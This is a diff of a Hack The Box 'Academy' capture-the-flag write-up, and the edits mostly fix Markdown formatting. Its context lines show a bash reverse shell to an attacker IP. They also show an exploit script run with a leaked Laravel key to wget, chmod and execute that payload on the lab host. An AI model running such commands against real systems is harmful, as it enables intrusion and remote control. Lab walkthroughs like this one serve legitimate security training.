@@ -267,14 +267,14 @@ We got shell as *www-data*
 
 ### Let's get an interactive reverse-shell
 
-*Create bash reverse-shell
+* Create bash reverse-shell
 ```
 ┌──(root💀kali)-[~]
 └─# cat pasha.sh
 bash -i >& /dev/tcp/10.10.14.133/1234 0>&1
 ```
 
-*Downloading from local web-server pasha.sh*
+* Downloading from local web-server pasha.sh
 ```
 ┌──(root💀kali)-[/home/kali/HTB/Academy]
 └─# /usr/bin/python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c 'cd /tmp;wget http://10.10.14.133:9191/pasha.sh -O pasha.sh;ls'   
@@ -282,7 +282,7 @@ bash -i >& /dev/tcp/10.10.14.133/1234 0>&1
 pasha.sh
 ```
 
-*Make socat executable*
+* Make socat executable
 ```
 ┌──(root💀kali)-[/home/kali/HTB/Academy]
 └─# /usr/bin/python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c 'cd /tmp;chmod +x pasha.sh;ls'
@@ -290,7 +290,7 @@ pasha.sh
 pasha.sh
 ```
 
-*Run it*
+* Run it
 ```
 ┌──(root💀kali)-[/home/kali/HTB/Academy]
 └─# /usr/bin/python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c 'cd /tmp;/bin/bash pasha.sh;ls'
@@ -317,7 +317,7 @@ ls /home/
 21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n
 ```
 
-And we see 5 users. Let see in every directory of users.
+And we have 5 users. Let see in every directory of users.
 
 ```
 www-data@academy:/home$ ls -lvpa 21y4d
